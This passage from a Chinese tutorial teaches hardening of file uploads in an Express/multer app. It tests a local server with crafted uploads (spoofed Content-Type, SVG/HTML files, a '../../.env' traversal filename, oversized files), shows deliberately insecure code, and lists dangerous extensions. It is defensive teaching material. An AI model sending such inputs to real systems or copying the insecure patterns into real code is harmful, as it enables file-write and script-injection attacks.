echo -n "2 SVG         "; curl -s -o /dev/null -w "%{http_code}\n" -X POST $B/api/avatar -H "$U" -F "file=@evil.svg"
echo -n "3 伪造类型    "; curl -s -o /dev/null -w "%{http_code}\n" -X POST $B/api/avatar -H "$U" -F "file=@evil.html;type=image/png;filename=avatar.png"
echo -n "4 穿越名      "; curl -s -o /dev/null -w "%{http_code}\n" -X POST $B/api/avatar -H "$U" -F "file=@ok.png;filename=../../.env"
echo -n "5 50MB        "; curl -s -o /dev/null -w "%{http_code}\n" -X POST $B/api/avatar -H "$U" -F "file=@big.bin"
echo -n "6 目录列表    "; curl -s -o /dev/null -w "%{http_code}\n" $B/storage/uploads/
echo -n "7 正常图      "; curl -s -o /dev/null -w "%{http_code}\n" -X POST $B/api/avatar -H "$U" -F "file=@ok.png"
```

**应该看到：**

```text
1 HTML        400
2 SVG         400
3 伪造类型    400
4 穿越名      201
5 50MB        413
6 目录列表    404
7 正常图      201
```

**逐条读：**

| # | 结果 | 说明 |
|---|---|---|
| 1—3 | `400` | ✅ 三道类型门都生效 |
| 4 | `201` | ✅ **这是对的** —— 文件名被忽略，图片本身合法，所以被接受 |
| 5 | `413` | ✅ 大小门生效 |
| 6 | `404` | ✅ 没有目录列表 |
| 7 | `201` | ✅ 正常功能没被堵死 |

**第 4 条的"201 也对"要理解：**

```text
我们不是"拒绝这个请求"，是"忽略它给的文件名"。
文件名由服务端生成，所以 ../../.env 这个字符串没有进入任何路径。
```

**验证文件名真的被忽略了：**

```bash
ls storage/uploads/ | tail -3
```

**应该看到：**

```text
3f2a1b0c-9d4e-4a7b-8c1d-2e5f6a7b8c9d.jpg
7a8b9c0d-1e2f-4a3b-9c4d-5e6f7a8b9c0d.jpg
```

**没有 `.env`，也没有 `..`。**

**再确认 `.env` 没被覆盖：**

```bash
ls -la ../.env 2>/dev/null || echo "✅ 没有 .env 被写到奇怪的地方"
```

---

# 第 8 步：故意犯五个错（30 分钟）

## 错误 1：只信 `Content-Type`

**操作：**

```js
if (!["image/png", "image/jpeg"].includes(req.file.mimetype)) {
  return res.status(400).json({ error: "BAD_TYPE" });
}
```

**会怎样：**

```bash
curl -s -X POST .../api/avatar -F "file=@evil.html;type=image/png;filename=avatar.png"
```

```json
{"ok":true,"name":"avatar.png","type":"image/png",...}
```

**为什么：** `mimetype` 是客户端在 multipart 的 `Content-Type` 里写的。**curl 能写，浏览器能改，Burp 能拦。**

**怎么修：** 扩展名白名单 + 魔数 + 重绘。

**怎么验证补住了：**

```bash
curl -s -X POST .../api/avatar -F "file=@evil.html;type=image/png;filename=avatar.png" | grep -c "BAD_"
```

**应该看到 `1`。**

## 错误 2：用黑名单挡扩展名

**操作：**

```js
const BAD = [".php", ".exe", ".sh", ".html"];
if (BAD.some((e) => name.endsWith(e))) return res.status(400).end();
```

**会怎样：**

```bash
curl -s -X POST .../api/avatar -F "file=@evil.svg"
```

**`evil.svg` 不在黑名单里，通过了。**

**为什么黑名单永远漏：**

```text
要挡：.php .php3 .php4 .php5 .php7 .phtml .pht .phar
     .html .htm .xhtml .shtml .svg .xml
     .js .mjs .cjs .jsp .asp .aspx .cgi .pl .py .rb
     .exe .sh .bat .cmd .ps1 .vbs .jar .war
     .htaccess .user.ini
再加上大小写变形、双扩展名（a.php.jpg）、编码变形（%2e）
你想不全。
```

**怎么修：** 反过来 —— 只允许 4 个。

**怎么验证补住了：**

```bash
for f in evil.svg evil.phtml a.php.jpg EVIL.HTML; do
  echo -n "$f → "; curl -s -o /dev/null -w "%{http_code}\n" -X POST .../api/avatar -F "file=@evil.html;filename=$f"
done
```

**应该四个都是 `400`。**

## 错误 3：用 `originalname` 拼路径

**操作：**

```js
fs.writeFileSync(path.join(UPLOAD_DIR, req.file.originalname), req.file.buffer);
```

**会怎样：**

```bash
curl -s -X POST .../api/avatar -F "file=@ok.png;filename=../../.env"
```

**文件被写到 `UPLOAD_DIR/../../.env`，也就是你的项目根目录的上一级。**

**为什么：** `path.join` 会"规整"路径，`..` 会被真的当成"上一级"。

**怎么修：** 服务端生成 UUID，`originalname` 只存数据库用来显示。

**怎么验证补住了：**

```bash
ls storage/uploads/ | grep -c "\.env"
```

**应该看到 `0`。**

**再做一次静态检查：**

```bash
git grep -n "originalname"
```

**应该只剩"存进数据库"和"截断后显示"两类用法，没有拼路径的。**

## 错误 4：存进 `public/`

**操作：**

```js
const upload = multer({ dest: "public/uploads/" });
app.use(express.static("public"));
```

**会怎样：**

```text
① 文件能被任何人用 URL 直接访问（不需要登录）
② 如果文件名猜得到，就能拿到别人的文件
③ 一旦哪天真被上传了 .html，浏览器直接渲染
```

**怎么修：** 挪到 `storage/`，走 `/api/files/:id` 读。

**怎么验证补住了：**

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3000/uploads/
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:3000/storage/uploads/
```

**两个都应该是 `404`。**

## 错误 5：不限制大小

**操作：** 去掉 `limits`，Nginx 也保持默认。

**会怎样：**

```bash
curl -s -o /dev/null -w "%{http_code}\n" -X POST http://127.0.0.1:3000/api/avatar -F "file=@big.bin"
```

**本地（没有 Nginx）：`200`，50MB 落盘。**

**线上（有 Nginx）：`413`，但那是 Nginx 的 1MB 默认值 —— 意味着"2MB 的头像也传不上去"。**

**两个方向都是问题：**

```text
不设：磁盘被打满（如果连 Nginx 都没有，比如直连 3000）
只靠 Nginx 默认：正常功能被误伤（1MB 太小）
```

**怎么修：** 两层都设，Nginx 略大于应用。

**怎么验证补住了：**

```bash
# 应用层：3MB → 413
curl -s -o /dev/null -w "app:%{http_code}\n" -X POST http://127.0.0.1:3000/api/avatar -F "file=@mid.bin"

# Nginx 层：3MB → 413，但 2MB 应该放行
curl -s -o /dev/null -w "nginx:%{http_code}\n" -X POST https://your-domain.com/api/avatar -F "file=@edge.bin"
```

**应该看到：**

```text
app:413
nginx:400
```

**`nginx:400` 说明 Nginx 放行了 2MB 的请求，是你的应用在"类型检查"上拒的 —— 这正是我们要的层次。**

---

# 第 9 步：写学习笔记（10 分钟）

```markdown
# 第 229 节课学习笔记

## 一、上传接口为什么比普通接口危险

用三句话写：

## 二、七种攻击

| # | 攻击 | 我传了什么 | 修好前的反应 | 修好后的反应 |
|---|---|---|---|---|
| 1 | HTML 钓鱼页 | | | |
| 2 | SVG 脚本 | | | |
| 3 | 伪造类型 | | | |
| 4 | 路径穿越名 | | | |
| 5 | 超大文件 | | | |
| 6 | 目录列表 | | | |
| 7 | 同名覆盖 | | | |

## 三、三道类型检查

| 检查 | 看什么 | 能被伪造吗 |
|---|---|---|
| 扩展名 | | |
| Content-Type | | |
| 魔数 | | |
| sharp 解码 | | |

哪一道最可靠，为什么：

## 四、大小限制

| 层 | 配置在哪 | 我设的值 | 超限时报什么 |
|---|---|---|---|
| Nginx | | | |
| multer | | | |

为什么 Nginx 要比应用稍大：

## 五、三层隔离

1. 文件名：
2. 位置：
3. 读取：

只做其中一层会怎样：

## 六、`nosniff` 和 `Content-Disposition`

`X-Content-Type-Options: nosniff` 防的是什么：

`inline` 和 `attachment` 的区别：

## 七、重绘解决了什么

除了安全，重绘还顺手解决了：

## 八、五个错误里，哪个最隐蔽

为什么：

## 九、我还不懂的词

## 十、完成检查

- [ ] 七种攻击都打过，修好后都挡住了
- [ ] 正常图片还能传
- [ ] `storage/uploads` 不能被直链访问
- [ ] 文件名是 UUID，不是原始名
- [ ] 有 413，且错误信息里有"最大多少"
```

---

# 第 10 步：课后练习

## 练习一：给真实项目做上传体检

**要求：**

1. 找出所有接收文件的地方（头像、附件、导入）；
2. 每个都检查五件事：
   - 扩展名白名单？
   - 魔数或解码检验？
   - 大小上限？Nginx 和应用层？
   - 文件名是服务端生成的吗？
   - 存储位置在 web 根里吗？
3. 有问题的列出修复顺序。

**记录：** 五个检查项各有几个不合格？

**思考题：** "导入 Excel"算不算文件上传？它有什么额外风险？

**提示：** 公式注入、超大字表、XML 外部实体。

## 练习二：写一个"上传白名单"配置

**要求：**

1. 列出你的业务真正需要的文件类型（不要"全都要"）；
2. 每种写：
   - 扩展名
   - 魔数
   - 最大尺寸
   - 是否需要重绘/转码
3. 放进一个 `uploads.config.js`。

**记录：** 你砍掉了哪几种"其实不需要"的类型？

**思考题：** 如果客户说"我们必须支持上传 zip"，你会怎么处理？

**提示：** 解压炸弹、路径穿越、压缩包里的可执行文件。

## 练习三：验证"重绘"真的清掉了 EXIF

**要求：**

1. 找一张带 GPS 信息的手机照片（或者用工具造一张带 EXIF 的图）；
2. 上传前，用工具读出 EXIF（`exiftool` 或者在线查看器，**注意别传真实私密照片**）；
3. 上传后下载回来，再读一次；
4. 对比。

**记录：** GPS 信息还在吗？拍摄设备型号还在吗？

**思考题：** 如果用户上传的是身份证照片，EXIF 之外还有什么隐私问题？

**提示：** 存储位置、访问权限、留存时间（第 230 节）。

## 练习四：给上传加限流

**要求：**

1. 同一个用户 1 分钟内最多传 5 个文件；
2. 超过返回 `429`；
3. 用 `express-rate-limit` 或自己写一个内存计数器。

**记录：** 第 6 次上传返回什么？

**思考题：** 限流能不能替代"大小限制"？

**提示：** 5 个 × 100MB = 500MB，一分钟也能塞满。

## 练习五：用一句话解释给客户听

**要求：** 写 100 字以内，回答："用户上传的文件安全吗？"

**记录：** 写了几版？

**思考题：** 客户听到"白名单""魔数"能懂吗？怎么换成他能懂的话？

**提示：** "只看名字不够，我们会打开看看里面到底是什么"。

---

# 第 11 步：最终验收

## A. 概念

- [ ] 我能说清为什么 `Content-Type` 不可信
- [ ] 我知道魔数是什么，能说出 PNG 的前 4 个字节
- [ ] 我知道为什么黑名单不够，白名单更好
- [ ] 我知道"三层隔离"是哪三层
- [ ] 我知道重绘除了安全还解决了什么

## B. 实操

- [ ] 我传过 `.html` 和 `.svg`，看到了后果
- [ ] 我用 `;type=image/png` 伪造过类型
- [ ] 我用 `../../.env` 当文件名试过
- [ ] 我传过 50MB 的文件
- [ ] 我改成白名单 + 魔数 + 重绘，七种攻击全挡住
- [ ] 我把文件挪到 web 根外，直链 404
- [ ] 我设了 Nginx 的 `client_max_body_size` 和 multer 的 `limits`
- [ ] 我加了 `nosniff`

## C. 排错

- [ ] 413 时，我能分清是 Nginx 还是应用返回的
- [ ] `MulterError: File too large` 我能接住并返回 413
- [ ] sharp 报 `Input buffer contains unsupported image format` 时我知道是"不是真图片"
- [ ] 上传后图片不显示，我知道去查 `Content-Type` 和路径
- [ ] `originalname` 是乱码时，我知道是编码问题，不影响安全

## D. 交付

- [ ] `attacks.md` 七条都有"修好前 / 修好后"
- [ ] `storage/uploads/` 里全是 UUID 文件名
- [ ] 数据库里存了 `original_name` 用来显示
- [ ] 有 413 的报错截图或原文

## E. 笔记

- [ ] `NOTES.md` 填完
- [ ] "哪一道检查最可靠"有明确答案
- [ ] "我还不懂的词"有内容

## 本节课要能说出口的一句话

> **上传的文件是"别人放进你服务器的东西"：名字、类型、大小都不能信，只能改名、限大、验证内容，然后放到执行不了的地方。**

---

# 附：常见问题速查

| 现象 | 原因 | 怎么做 |
|---|---|---|
| `MulterError: File too large` | 超过 `limits.fileSize` | 接住错误返 413，并告诉用户上限 |
| `413 Request Entity Too Large` 且页面是 nginx 的 | Nginx `client_max_body_size` 太小 | 调到略大于应用限制 |
| `req.file` 是 `undefined` | 字段名不匹配 | `upload.single("file")` 要和表单的 `name` 一致 |
| `Unexpected field` | 传了多个文件或字段名错 | 用 `upload.array` 或检查字段名 |
| 图片上传后不显示 | 路径不对 / `Content-Type` 不对 | 用接口返回的 `url`，查响应头 |
| 上传后文件名是乱码 | 浏览器发的文件名编码不一致 | 存原始名时按 UTF-8 处理，显示时再解码 |
| sharp 报 `unsupported image format` | 不是真图片，或格式太新 | 这通常是"正确拒绝"，返回 400 |
| 重绘后图片变模糊 | `quality` 太低或 `resize` 太小 | 调 `quality: 82` 起，`resize` 别低于 800 |
| 重绘后透明背景变黑 | JPEG 不支持透明 | 输出 PNG，或用 `flatten({background:"#fff"})` |
| `ERR_REQUIRE_ESM` | 装了纯 ESM 版本的库 | 用手写魔数，或 `await import()` |
| 直链还能访问上传文件 | 文件还在 `public/` 里 | 挪到 `storage/`，走鉴权接口 |
| Nginx 返回 403 而不是 404 | 目录存在但无索引 | 想隐藏就 `return 404` |
| 上传目录被列出来了 | `autoindex on` | 关掉，或压根不放在 web 根 |
| 用户抱怨"2MB 传不上去" | 边界计算差了几百字节 | Nginx 比应用大 1MB |
| 传了很多文件磁盘满了 | 没做限流和清理 | 加限流 + 定期清理孤儿文件 |
| SVG 传上去后弹窗 | SVG 里的 `<script>` 被执行 | 不收 SVG，或转 PNG |
